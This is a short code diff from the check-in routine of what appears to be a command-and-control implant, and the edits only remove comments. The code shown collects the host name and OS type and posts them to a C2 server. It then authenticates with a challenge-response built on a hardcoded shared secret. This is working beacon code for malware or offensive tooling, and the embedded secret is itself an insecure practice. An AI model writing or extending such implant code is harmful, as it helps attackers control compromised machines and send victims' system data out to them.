@@ -116,13 +116,10 @@ def check_in():
     Uses challenge-response for mutual authentication
     """
     try:
-        # Get OS information
         os_info = find_os()
         
-        # Generate a client nonce
         client_nonce = secrets.token_hex(8)
         
-        # Prepare check-in data
         data = {
             'aid': platform.node(),  # Use hostname as agent ID
             'ops': os_info['type'],
@@ -130,7 +127,6 @@ def check_in():
             'nonce': client_nonce
         }
         
-        # Send check-in request
         resp = session.post(
             f"{C2_SERVER}/overview", 
             json=data, 
@@ -149,7 +145,6 @@ def check_in():
             ############# replace with secure KMS in future ###################
             shared_secret = "uacneQWE1AKfjf"  
             
-            # Calculate challenge response
             challenge_response = hash_challenge(
                 challenge=server_nonce,
                 shared_secret=shared_secret
